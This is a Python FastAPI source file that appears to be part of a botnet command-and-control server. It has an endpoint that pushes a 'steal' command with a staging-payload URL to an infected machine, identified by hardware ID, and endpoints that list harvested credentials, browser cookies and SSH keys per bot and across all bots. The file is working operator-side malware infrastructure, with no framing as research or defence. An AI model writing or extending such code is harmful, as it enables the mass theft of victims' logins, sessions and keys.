"""Stealer results router and convenience steal dispatch."""
import json
import time
import uuid

from fastapi import APIRouter, HTTPException, status
from pydantic import BaseModel

from ...protocol import write_packet
from ...storage import (
    get_bot,
    list_active_staging_payloads,
    list_all_stealer_results,
    list_stealer_results_for_bot,
    mark_command_dispatched,
    save_command,
)
from ..deps import CurrentUser, EventBusDep, RegistryDep
from ..events import Event, EventType
from ..schemas import StealResult, StealResultListResponse

router = APIRouter(prefix="/api", tags=["stealer"])


class StealRequest(BaseModel):
    staging_base_url: str = "http://127.0.0.1:8080"
    timeout_secs: int = 60


@router.post("/bots/{hwid}/steal")
async def dispatch_steal(
    hwid: str,
    body: StealRequest,
    current_user: CurrentUser,
    registry: RegistryDep,
    event_bus: EventBusDep,
):
    """Convenience endpoint: finds active stealer payload and dispatches steal command."""
    bot = await get_bot(hwid)
    if not bot:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Bot not found")

    payloads = await list_active_staging_payloads(stage_number=None)
    if not payloads:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="No active stealer payload. Upload one via /api/staging/upload first.",
        )
    payload = sorted(payloads, key=lambda p: p["created_at"], reverse=True)[0]

    cmd_args = {
        "payload_id": payload["id"],
        "sha256": payload["sha256"],
        "staging_url": body.staging_base_url.rstrip("/"),
        "timeout_secs": body.timeout_secs,
    }
    cmd_id = str(uuid.uuid4())
    conn = await registry.get(hwid)
    is_online = conn is not None

    if is_online:
        packet = {
            "id": cmd_id,
            "seq": 0,
            "timestamp": int(time.time()),
            "type": "command",
            "data": {"command_type": "steal", "args": cmd_args},
        }
        await write_packet(conn.writer, conn.crypto, packet)
        await save_command(
            cmd_id, hwid, "steal", json.dumps(cmd_args),
            operator_id=current_user["id"], status="dispatched",
        )
        await mark_command_dispatched(cmd_id)
    else:
        await save_command(
            cmd_id, hwid, "steal", json.dumps(cmd_args),
            operator_id=current_user["id"], status="pending",
        )

    if event_bus:
        await event_bus.publish(Event(
            EventType.COMMAND_DISPATCHED,
            {"command_id": cmd_id, "hwid": hwid, "command_type": "steal"},
        ))

    return {
        "command_id": cmd_id,
        "command_type": "steal",
        "queued": not is_online,
        "args": cmd_args,
    }


def _row_to_result(row: dict) -> StealResult:
    return StealResult(
        id=row["id"],
        bot_hwid=row["bot_hwid"],
        command_id=row["command_id"],
        credentials=json.loads(row["credentials"] or "[]"),
        cookies=json.loads(row["cookies"] or "[]"),
        ssh_keys=json.loads(row["ssh_keys"] or "[]"),
        errors=json.loads(row["errors"] or "[]"),
        collection_time_ms=row["collection_time_ms"],
        received_at=row["received_at"],
    )


@router.get("/bots/{hwid}/stealer-results", response_model=StealResultListResponse)
async def get_bot_stealer_results(hwid: str, current_user: CurrentUser):
    """List all stealer results for a bot, newest first."""
    rows = await list_stealer_results_for_bot(hwid)
    return StealResultListResponse(
        results=[_row_to_result(r) for r in rows],
        total=len(rows),
    )


@router.get("/stealer-results", response_model=StealResultListResponse)
async def get_all_stealer_results(current_user: CurrentUser, limit: int = 100):
    """List all stealer results across all bots."""
    rows = await list_all_stealer_results(limit=limit)
    return StealResultListResponse(
        results=[_row_to_result(r) for r in rows],
        total=len(rows),
    )
